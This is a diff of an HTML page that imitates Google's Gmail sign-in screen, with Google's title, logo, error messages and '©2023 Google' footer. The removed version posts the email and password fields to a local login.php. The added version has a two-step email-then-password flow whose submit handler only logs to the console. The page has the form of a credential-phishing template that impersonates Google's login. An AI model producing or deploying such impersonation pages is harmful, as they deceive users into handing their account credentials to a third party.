@@ -3,153 +3,420 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
-<!--    <script src="https://cdn.tailwindcss.com"></script> -->
-    <link rel="stylesheet" href="all-tailwind-classes-full.css">
-<!--    <link rel="stylesheet" href="all-tailwind-classes-full-min.css"> -->
+    <title>Gmail - Email by Google</title>
     <style>
-        body {
-            font-family: 'Roboto', Arial, sans-serif;
-            background-color: #ffffff;
-            color: #202124;
+        :root {
+            --primary-color: #1a73e8;
+            --secondary-color: #5f6368;
+            --error-color: #d93025;
+            --bg-color: #ffffff;
+            --text-color: #202124;
+            --border-color: #dadce0;
+            --hover-bg: #f7f8f8;
+            --footer-bg: #f2f2f2;
+            --font-main: 'Google Sans', Arial, sans-serif;
+        }
+
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--font-main);
+            color: var(--text-color);
+            background-color: var(--bg-color);
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
-            min-height: 100vh;
         }
-        .google-logo {
-            height: 259px;
-            width: 607px;
-            background-image: url('glogo.png');
-            background-repeat: no-repeat;
-            background-size: contain;
+
+        .header {
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
-        .input-field {
-            border: 1px solid #dadce0;
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo {
+            height: 32px;
+            margin-right: 8px;
+        }
+
+        .logo-text {
+            font-size: 22px;
+            font-weight: 500;
+            color: var(--secondary-color);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 16px;
+        }
+
+        .nav-link {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            padding: 8px 12px;
             border-radius: 4px;
-            padding: 13px 15px;
-            font-size: 16px;
+        }
+
+        .nav-link:hover {
+            background-color: rgba(26, 115, 232, 0.08);
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .login-card {
             width: 100%;
-            box-sizing: border-box;
+            max-width: 450px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            margin-bottom: 24px;
+        }
+
+        .login-title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .login-subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            color: var(--secondary-color);
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .form-input {
+            width: 100%;
+            height: 54px;
+            padding: 16px 14px;
+            font-size: 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            outline: none;
             transition: border 0.2s;
         }
-        .input-field:focus {
-            border: 1px solid #1a73e8;
-            outline: none;
+
+        .form-input:focus {
+            border: 2px solid var(--primary-color);
+            padding: 15px 13px;
         }
-        .btn-primary {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 4px;
+
+        .form-input.error {
+            border-color: var(--error-color);
+        }
+
+        .form-label {
+            position: absolute;
+            top: 16px;
+            left: 14px;
+            color: var(--secondary-color);
+            font-size: 16px;
+            transition: all 0.2s;
+            pointer-events: none;
+            background-color: var(--bg-color);
+            padding: 0 4px;
+        }
+
+        .form-input:focus + .form-label,
+        .form-input:not(:placeholder-shown) + .form-label {
+            top: -8px;
+            left: 10px;
+            font-size: 12px;
+            color: var(--primary-color);
+        }
+
+        .form-input.error + .form-label {
+            color: var(--error-color);
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .form-input.error ~ .error-message {
+            display: block;
+        }
+
+        .forgot-link {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-block;
+            margin-bottom: 26px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-account {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .btn {
             padding: 10px 24px;
+            border-radius: 4px;
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
-            transition: background-color 0.2s;
+            border: none;
+            outline: none;
+            transition: background-color 0.2s, box-shadow 0.2s;
         }
+
+        .btn-primary {
+            background-color: var(--primary-color);
+            color: white;
+        }
+
         .btn-primary:hover {
             background-color: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(26, 115, 232, 0.3);
         }
-        .link-primary {
-            color: #1a73e8;
-            text-decoration: none;
-            font-weight: 500;
+
+        .btn-primary:active {
+            background-color: #185abc;
+        }
+
+        .btn-secondary {
+            background-color: transparent;
+            color: var(--primary-color);
+        }
+
+        .btn-secondary:hover {
+            background-color: rgba(26, 115, 232, 0.08);
+        }
+
+        .footer {
+            background-color: var(--footer-bg);
+            padding: 24px 0;
+            width: 100%;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .footer-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .language-selector select {
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 8px 12px;
+            background-color: transparent;
+            font-size: 13px;
+            color: var(--secondary-color);
             cursor: pointer;
         }
-        .link-primary:hover {
-            text-decoration: underline;
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
         }
+
         .footer-link {
-            color: #5f6368;
+            color: var(--secondary-color);
             text-decoration: none;
-            font-size: 12px;
-            padding: 10px;
+            font-size: 13px;
         }
+
         .footer-link:hover {
             text-decoration: underline;
         }
+
+        .footer-bottom {
+            color: var(--secondary-color);
+            font-size: 12px;
+            text-align: center;
+        }
+
+        @media (max-width: 600px) {
+            .login-card {
+                border: none;
+                padding: 24px;
+            }
+
+            .header {
+                padding: 12px;
+            }
+
+            .nav-links {
+                display: none;
+            }
+
+            .footer-top {
+                flex-direction: column;
+                gap: 16px;
+            }
+
+            .footer-links {
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 12px;
+            }
+        }
     </style>
 </head>
-<body class="flex flex-col min-h-screen">
-    <header class="flex justify-between items-center px-4 py-3">
-        <div class="flex items-center space-x-4">
-            <div class="google-logo"></div>
+<body>
+    <header class="header">
+        <div class="logo-container">
+            <img src="gmail.png" alt="Gmail logo" class="logo">
+            <span class="logo-text">Gmail</span>
         </div>
-        <div class="flex items-center space-x-4">
-            <a href="#" class="text-sm text-gray-600 hover:underline">Help</a>
-            <a href="#" class="text-sm text-gray-600 hover:underline">Privacy</a>
-            <a href="#" class="text-sm text-gray-600 hover:underline">Terms</a>
-        </div>
+        <nav class="nav-links">
+            <a href="#" class="nav-link">For work</a>
+            <a href="#" class="nav-link">Sign in</a>
+        </nav>
     </header>
 
-    <main class="flex-grow flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
-        <div class="max-w-md w-full space-y-8">
-            <div class="text-center">
-                <h1 class="text-2xl font-medium">Sign in</h1>
-                <p class="mt-2 text-sm text-gray-600">to continue to Gmail</p>
-            </div>
-            <form class="mt-8 space-y-6" action="login.php" method="POST">
-                <div class="rounded-md shadow-sm space-y-4">
-                    <div>
-                        <input id="email" name="username" type="email" autocomplete="email" required 
-                            class="input-field" placeholder="Email or phone">
-                    </div>
-                    <div>
-                        <input id="password" name="password" type="password" autocomplete="current-password" required 
-                            class="input-field" placeholder="Password">
-                    </div>
+    <main class="main-container">
+        <div class="login-card">
+            <h1 class="login-title">Sign in</h1>
+            <p class="login-subtitle">to continue to Gmail</p>
+
+            <form action="login.php" method="POST" id="loginForm">
+                <div class="form-group">
+                    <input type="email" id="email" class="form-input" placeholder=" " required>
+                    <label for="email" class="form-label">Email or phone</label>
+                    <div class="error-message">Couldn't find your Google Account</div>
                 </div>
 
-                <div class="flex items-center justify-between">
-                    <div class="flex items-center">
-                        <input id="remember-me" name="remember-me" type="checkbox" 
-                            class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
-                        <label for="remember-me" class="ml-2 block text-sm text-gray-700">
-                            Remember me
-                        </label>
-                    </div>
-                    <div class="text-sm">
-                        <a href="#" class="link-primary">
-                            Forgot password?
-                        </a>
-                    </div>
+                <div class="form-group" style="display: none;">
+                    <input type="password" id="password" class="form-input" placeholder=" " required>
+                    <label for="password" class="form-label">Enter your password</label>
+                    <div class="error-message">Wrong password. Try again or click Forgot password to reset it.</div>
                 </div>
 
-                <div class="flex justify-between items-center">
-                    <a href="#" class="link-primary text-sm">Create account</a>
-                    <button type="submit" class="btn-primary">
-                        Next
-                    </button>
+                <a href="#" class="forgot-link" id="forgotEmail">Forgot email?</a>
+                <a href="#" class="forgot-link" id="forgotPassword" style="display: none;">Forgot password?</a>
+
+                <div class="button-group">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="button" class="btn btn-primary" id="nextButton">Next</button>
+                    <button type="submit" class="btn btn-primary" id="signInButton" style="display: none;">Sign in</button>
                 </div>
             </form>
-
-            <div class="text-center text-sm text-gray-500">
-                <p>Not your computer? Use Guest mode to sign in privately.</p>
-                <a href="#" class="link-primary">Learn more</a>
-            </div>
         </div>
     </main>
 
-    <footer class="bg-gray-100 py-4 px-8">
-        <div class="max-w-6xl mx-auto">
-            <div class="flex flex-col md:flex-row md:justify-between">
-                <div class="flex justify-center md:justify-start">
-                    <select class="bg-transparent text-gray-700 text-sm border-none focus:outline-none">
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-top">
+                <div class="language-selector">
+                    <span>English (United States)</span>
+                    <select>
                         <option>English (United States)</option>
-                        <option>Español</option>
-                        <option>Français</option>
+                        <option>Español (España)</option>
+                        <option>Français (France)</option>
                         <option>Deutsch</option>
+                        <option>Italiano</option>
                     </select>
                 </div>
-                <div class="flex flex-wrap justify-center md:justify-end mt-4 md:mt-0">
+                <div class="footer-links">
                     <a href="#" class="footer-link">Help</a>
                     <a href="#" class="footer-link">Privacy</a>
                     <a href="#" class="footer-link">Terms</a>
                 </div>
             </div>
+            <div class="footer-bottom">
+                ©2023 Google
+            </div>
         </div>
     </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const forgotEmailLink = document.getElementById('forgotEmail');
+            const forgotPasswordLink = document.getElementById('forgotPassword');
+            const nextButton = document.getElementById('nextButton');
+            const signInButton = document.getElementById('signInButton');
+            const passwordFormGroup = document.querySelector('.form-group:nth-child(2)');
+
+            nextButton.addEventListener('click', function() {
+                if (emailInput.value.trim() === '') {
+                    emailInput.classList.add('error');
+                    return;
+                }
+
+                // Simulate email validation
+                if (!emailInput.value.includes('@')) {
+                    emailInput.classList.add('error');
+                    return;
+                }
+
+                emailInput.classList.remove('error');
+                passwordFormGroup.style.display = 'block';
+                forgotEmailLink.style.display = 'none';
+                forgotPasswordLink.style.display = 'block';
+                nextButton.style.display = 'none';
+                signInButton.style.display = 'block';
+            });
+
+            // Form submission handler
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                // Here you would typically handle the actual login
+                console.log('Form submitted');
+            });
+        });
+    </script>
 </body>
 </html>
